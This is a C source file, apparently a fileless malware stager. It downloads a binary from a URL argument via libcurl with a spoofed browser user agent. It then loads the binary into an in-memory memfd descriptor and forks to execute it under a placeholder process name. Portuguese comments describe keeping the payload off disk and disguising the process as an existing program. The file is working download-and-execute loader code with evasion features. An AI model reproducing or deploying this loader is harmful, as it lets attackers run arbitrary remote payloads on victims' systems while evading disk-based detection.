#define _GNU_SOURCE
#include <sys/mman.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/stat.h>
#include <curl/curl.h>
//execl("/bin/sh","teste",(char* )NULL);
struct souzomem{
    char *mem;
    size_t ssize;
};
size_t get_file_size(const char *filename){
    struct stat st;
    if(stat(filename,&st) == -1){
        return -1;
    }
    return st.st_size;
}
size_t souzowrite(void *content,size_t size,size_t nmemb,void *userp){
    size_t rsize = size * nmemb;
    struct souzomem *mem = (struct souzomem *)userp;
    char *ptr=realloc(mem->mem,mem->ssize+rsize+1);
    if(!ptr)
        return 0;
    mem->mem = ptr;
    memcpy(&(mem->mem[mem->ssize]),content,rsize);
    mem->ssize += rsize;
    mem->mem[mem->ssize]= 0;
    return rsize;
}
void downloadexec(char url[]){
    if(strlen(url) <=0) return;
    struct souzomem buffer = {
        .mem = malloc(1),
        .ssize=0
    };
    curl_global_init(CURL_GLOBAL_ALL);
    CURL *chandle = curl_easy_init();
    curl_easy_setopt(chandle,CURLOPT_URL,url);
    curl_easy_setopt(chandle,CURLOPT_FOLLOWLOCATION,1);
    curl_easy_setopt(chandle,CURLOPT_WRITEFUNCTION,souzowrite);
    curl_easy_setopt(chandle,CURLOPT_WRITEDATA,&buffer);
    curl_easy_setopt(chandle,CURLOPT_USERAGENT,"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0");
    CURLcode rcode = curl_easy_perform(chandle);
    if(rcode != CURLE_OK){
        #ifdef DEBUG
        printf("curl erro %s\n",curl_easy_strerror(rcode));
        #endif
        return;
    }
    #ifdef DEBUG
    printf("%lu bytes received\n",(unsigned long)buffer.ssize);
    #endif
    curl_easy_cleanup(chandle);
    curl_global_cleanup();
    char a[300] = {};
    int fds = memfd_create("",MFD_CLOEXEC);
    sprintf(a,"/proc/self/fd/%d",fds);
    write(fds,buffer.mem,buffer.ssize);
    pid_t id= fork();
    //o nome é interessante criar uma função que pegue um nome aleatorio de algum programa ja existente.
    char name[100] = "Nome do programa";
    if(id ==0)
        execl(a,name,(char *)NULL);
}
int main(int argc, char *argv[]){
    //usa uma técnica para não encostar o arquivo no disco, apenas na memória.
    downloadexec(argv[1]);
}
